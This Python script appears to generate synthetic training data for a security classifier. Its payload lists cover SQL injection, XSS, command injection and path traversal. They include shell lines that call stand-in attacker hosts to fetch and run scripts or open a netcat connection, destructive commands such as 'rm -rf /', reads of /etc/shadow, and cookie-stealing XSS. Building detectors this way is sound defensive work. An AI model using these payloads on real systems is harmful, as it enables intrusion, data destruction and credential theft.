"""
Quick Training Script - Generate diverse security data and train IPL in under 30 minutes
"""
import time
import random
import json
import numpy as np
from autonomous_decision_engine import (
    AutonomousDecisionEngine,
    Decision,
    DecisionType,
    DecisionOutcome
)
from intelligent_load_controller import IntelligentLoadController, ServerState


def generate_sql_injection_scenarios(n=50):
    """Generate SQL injection attack scenarios"""
    scenarios = []
    payloads = [
        "' OR '1'='1",
        "' OR '1'='1'--",
        "' OR '1'='1'/*",
        "' OR 1=1--",
        "' OR 1=1#",
        "' OR 1=1/*",
        "admin'--",
        "admin'/*",
        "' UNION SELECT NULL--",
        "' UNION SELECT NULL,NULL--",
        "' UNION SELECT 1,2,3--",
        "' AND 1=1--",
        "' AND 1=2--",
        "' AND SLEEP(5)--",
        "'; DROP TABLE users--",
        "'; DELETE FROM users--",
        "' OR 'x'='x",
        "' OR 1=1 LIMIT 1--",
        "1' ORDER BY 1--",
        "1' ORDER BY 2--",
    ]
    
    for i in range(n):
        payload = random.choice(payloads)
        scenarios.append({
            'has_untrusted_data': True,
            'has_sanitization': False,
            'taint_propagation_steps': random.randint(1, 10),
            'num_nodes': random.randint(5, 20),
            'num_edges': random.randint(8, 30),
            'avg_degree': random.uniform(2.0, 4.0),
            'execution_count': random.randint(10, 100),
            'avg_execution_time_ms': random.uniform(5.0, 20.0),
            'sql_sink_count': 1,
            'html_sink_count': 0,
            'shell_sink_count': 0,
            'file_sink_count': 0,
            'sql_injection_score': random.uniform(0.7, 1.0),
            'xss_score': 0.0,
            'command_injection_score': 0.0,
            'attack_type': 'sql_injection',
            'expected_safe': False
        })
    return scenarios


def generate_xss_scenarios(n=50):
    """Generate XSS attack scenarios"""
    scenarios = []
    payloads = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg/onload=alert('XSS')>",
        "<body onload=alert('XSS')>",
        "<div onmouseover=alert('XSS')>",
        "<iframe src='javascript:alert(1)'>",
        "<input autofocus onfocus=alert(1)>",
        "<script>document.location='http://evil.com'</script>",
        "<img src=x onerror=document.location='http://evil.com'>",
        "javascript:alert(1)",
        "<script>alert(document.cookie)</script>",
        "<img src=x onerror=alert(document.cookie)>",
        "<script>document.body.innerHTML='<script>alert(1)</script>'</script>",
        "'><script>alert(1)</script>",
        "<script src='http://evil.com/evil.js'></script>",
    ]
    
    for i in range(n):
        payload = random.choice(payloads)
        scenarios.append({
            'has_untrusted_data': True,
            'has_sanitization': False,
            'taint_propagation_steps': random.randint(1, 8),
            'num_nodes': random.randint(5, 15),
            'num_edges': random.randint(8, 25),
            'avg_degree': random.uniform(2.0, 3.5),
            'execution_count': random.randint(10, 80),
            'avg_execution_time_ms': random.uniform(3.0, 15.0),
            'sql_sink_count': 0,
            'html_sink_count': 1,
            'shell_sink_count': 0,
            'file_sink_count': 0,
            'sql_injection_score': 0.0,
            'xss_score': random.uniform(0.7, 1.0),
            'command_injection_score': 0.0,
            'attack_type': 'xss',
            'expected_safe': False
        })
    return scenarios


def generate_command_injection_scenarios(n=40):
    """Generate command injection attack scenarios"""
    scenarios = []
    payloads = [
        "; rm -rf /",
        "&& cat /etc/passwd",
        "|| nc attacker.com 4444",
        "$(reboot)",
        "`whoami`",
        "; wget http://evil.com/shell.sh",
        "&& bash shell.sh",
        "|| python exploit.py",
        "$(curl attacker.com)",
        "`curl attacker.com | bash`",
        "; id",
        "&& ls -la",
        "|| ps aux",
        "$(uname -a)",
        "`cat /etc/shadow`",
    ]
    
    for i in range(n):
        payload = random.choice(payloads)
        scenarios.append({
            'has_untrusted_data': True,
            'has_sanitization': False,
            'taint_propagation_steps': random.randint(1, 6),
            'num_nodes': random.randint(4, 12),
            'num_edges': random.randint(6, 20),
            'avg_degree': random.uniform(2.0, 3.0),
            'execution_count': random.randint(5, 50),
            'avg_execution_time_ms': random.uniform(2.0, 10.0),
            'sql_sink_count': 0,
            'html_sink_count': 0,
            'shell_sink_count': 1,
            'file_sink_count': 0,
            'sql_injection_score': 0.0,
            'xss_score': 0.0,
            'command_injection_score': random.uniform(0.7, 1.0),
            'attack_type': 'command_injection',
            'expected_safe': False
        })
    return scenarios


def generate_path_traversal_scenarios(n=30):
    """Generate path traversal attack scenarios"""
    scenarios = []
    payloads = [
        "../../etc/passwd",
        "..\\..\\..\\windows\\system32",
        "....//....//....//etc/passwd",
        "%2e%2e%2fetc%2fpasswd",
        "..%5c..%5c..%5cwindows%5csystem32",
        "....//....//boot.ini",
        "/etc/passwd",
        "\\windows\\system32\\drivers\\etc\\hosts",
        "../../../../etc/shadow",
        "..\\..\\..\\..\\windows\\repair\\sam",
    ]
    
    for i in range(n):
        payload = random.choice(payloads)
        scenarios.append({
            'has_untrusted_data': True,
            'has_sanitization': False,
            'taint_propagation_steps': random.randint(1, 5),
            'num_nodes': random.randint(4, 10),
            'num_edges': random.randint(6, 15),
            'avg_degree': random.uniform(2.0, 3.0),
            'execution_count': random.randint(5, 40),
            'avg_execution_time_ms': random.uniform(2.0, 8.0),
            'sql_sink_count': 0,
            'html_sink_count': 0,
            'shell_sink_count': 0,
            'file_sink_count': 1,
            'sql_injection_score': 0.0,
            'xss_score': 0.0,
            'command_injection_score': 0.0,
            'path_traversal_score': random.uniform(0.7, 1.0),
            'attack_type': 'path_traversal',
            'expected_safe': False
        })
    return scenarios


def generate_safe_scenarios(n=100):
    """Generate safe code scenarios"""
    scenarios = []
    
    # Safe code patterns
    patterns = [
        "Hardcoded constants",
        "Parameterized queries",
        "Sanitized input",
        "Input validation",
        "Safe HTML encoding",
        "Safe file operations",
        "No user input",
    ]
    
    for i in range(n):
        pattern = random.choice(patterns)
        scenarios.append({
            'has_untrusted_data': False if pattern in ["Hardcoded constants", "No user input"] else True,
            'has_sanitization': True if pattern in ["Sanitized input", "Parameterized queries", "Safe HTML encoding"] else False,
            'taint_propagation_steps': 0 if pattern in ["Hardcoded constants", "No user input"] else random.randint(1, 3),
            'num_nodes': random.randint(5, 25),
            'num_edges': random.randint(8, 35),
            'avg_degree': random.uniform(2.0, 3.5),
            'execution_count': random.randint(20, 200),
            'avg_execution_time_ms': random.uniform(2.0, 15.0),
            'sql_sink_count': 1 if pattern == "Parameterized queries" else 0,
            'html_sink_count': 1 if pattern == "Safe HTML encoding" else 0,
            'shell_sink_count': 0,
            'file_sink_count': 1 if pattern == "Safe file operations" else 0,
            'sql_injection_score': 0.0,
            'xss_score': 0.0,
            'command_injection_score': 0.0,
            'path_traversal_score': 0.0,
            'attack_type': 'safe',
            'expected_safe': True
        })
    return scenarios


def quick_train():
    """Quick training with diverse attack types"""
    print("=" * 70)
    print("QUICK TRAINING - DIVERSE SECURITY DATA")
    print("=" * 70)
    
    start_time = time.time()
    
    # Generate diverse scenarios
    print("\n[1/4] Generating diverse security scenarios...")
    gen_start = time.time()
    
    all_scenarios = []
    all_scenarios.extend(generate_sql_injection_scenarios(50))
    print(f"  ✓ SQL Injection: 50 scenarios")
    
    all_scenarios.extend(generate_xss_scenarios(50))
    print(f"  ✓ XSS: 50 scenarios")
    
    all_scenarios.extend(generate_command_injection_scenarios(40))
    print(f"  ✓ Command Injection: 40 scenarios")
    
    all_scenarios.extend(generate_path_traversal_scenarios(30))
    print(f"  ✓ Path Traversal: 30 scenarios")
    
    all_scenarios.extend(generate_safe_scenarios(100))
    print(f"  ✓ Safe Code: 100 scenarios")
    
    print(f"  Total: {len(all_scenarios)} scenarios")
    print(f"  Time: {time.time() - gen_start:.2f}s")
    
    # Initialize engine
    print("\n[2/4] Initializing Autonomous Decision Engine...")
    engine = AutonomousDecisionEngine(use_intelligent_components=True)
    
    # Train with scenarios
    print("\n[3/4] Training with diverse scenarios...")
    train_start = time.time()
    
    total_decisions = 0
    correct_decisions = 0
    
    for i, scenario in enumerate(all_scenarios):
        # Extract context (64 features)
        context = {
            'has_untrusted_data': scenario['has_untrusted_data'],
            'has_sanitization': scenario['has_sanitization'],
            'taint_propagation_steps': scenario['taint_propagation_steps'],
            'num_nodes': scenario['num_nodes'],
            'num_edges': scenario['num_edges'],
            'avg_degree': scenario['avg_degree'],
            'execution_count': scenario['execution_count'],
            'avg_execution_time_ms': scenario['avg_execution_time_ms'],
            'sql_sink_count': scenario.get('sql_sink_count', 0),
            'html_sink_count': scenario.get('html_sink_count', 0),
            'shell_sink_count': scenario.get('shell_sink_count', 0),
            'file_sink_count': scenario.get('file_sink_count', 0),
            'sql_injection_score': scenario.get('sql_injection_score', 0.0),
            'xss_score': scenario.get('xss_score', 0.0),
            'command_injection_score': scenario.get('command_injection_score', 0.0),
            'path_traversal_score': scenario.get('path_traversal_score', 0.0),
        }
        
        # Make decision
        judgment = engine.judge_safety(context)
        
        # Record outcome
        decision = Decision(
            decision_id=f"dec_{total_decisions}",
            decision_type=DecisionType.SECURITY,
            context=context,
            action=judgment.is_safe,
            confidence=judgment.confidence,
            timestamp=time.time()
        )
        
        # Determine if correct
        is_correct = (judgment.is_safe == scenario['expected_safe'])
        if is_correct:
            correct_decisions += 1
        
        outcome = DecisionOutcome.GOOD if is_correct else DecisionOutcome.BAD
        reward = 1.0 if is_correct else -1.0
        
        engine.record_outcome(decision, outcome, reward=reward)
        total_decisions += 1
        
        if (i + 1) % 50 == 0:
            print(f"  ✓ Processed {i+1}/{len(all_scenarios)} scenarios")
    
    train_time = time.time() - train_start
    print(f"  Training time: {train_time:.2f}s")
    
    # Get statistics
    stats = engine.get_statistics()
    
    # Save structured data
    print("\n[4/4] Saving structured training data...")
    save_start = time.time()
    
    structured_data = []
    for i, scenario in enumerate(all_scenarios):
        structured_data.append({
            'id': f"sample_{i}",
            'attack_type': scenario['attack_type'],
            'features': {
                'has_untrusted_data': scenario['has_untrusted_data'],
                'has_sanitization': scenario['has_sanitization'],
                'taint_propagation_steps': scenario['taint_propagation_steps'],
                'num_nodes': scenario['num_nodes'],
                'num_edges': scenario['num_edges'],
                'avg_degree': scenario['avg_degree'],
                'execution_count': scenario['execution_count'],
                'avg_execution_time_ms': scenario['avg_execution_time_ms'],
                'sql_sink_count': scenario.get('sql_sink_count', 0),
                'html_sink_count': scenario.get('html_sink_count', 0),
                'shell_sink_count': scenario.get('shell_sink_count', 0),
                'file_sink_count': scenario.get('file_sink_count', 0),
                'sql_injection_score': scenario.get('sql_injection_score', 0.0),
                'xss_score': scenario.get('xss_score', 0.0),
                'command_injection_score': scenario.get('command_injection_score', 0.0),
                'path_traversal_score': scenario.get('path_traversal_score', 0.0),
            },
            'label': 1 if not scenario['expected_safe'] else 0,
            'expected_safe': scenario['expected_safe']
        })
    
    with open('.ipl_data/quick_training_data.json', 'w') as f:
        json.dump(structured_data, f, indent=2)
    
    print(f"  ✓ Saved {len(structured_data)} samples to .ipl_data/quick_training_data.json")
    print(f"  Save time: {time.time() - save_start:.2f}s")
    
    # Summary
    total_time = time.time() - start_time
    print("\n" + "=" * 70)
    print("QUICK TRAINING COMPLETE")
    print("=" * 70)
    print(f"Total scenarios: {len(all_scenarios)}")
    print(f"Attack types: SQLi, XSS, CMDi, Path Traversal, Safe")
    print(f"Total decisions: {stats['total_decisions']}")
    print(f"Success rate: {stats['success_rate']:.2%}")
    print(f"Training samples: {stats['training_samples_collected']}")
    print(f"Total time: {total_time:.2f}s ({total_time/60:.2f} minutes)")
    print("=" * 70)
    
    return engine


if __name__ == "__main__":
    quick_train()
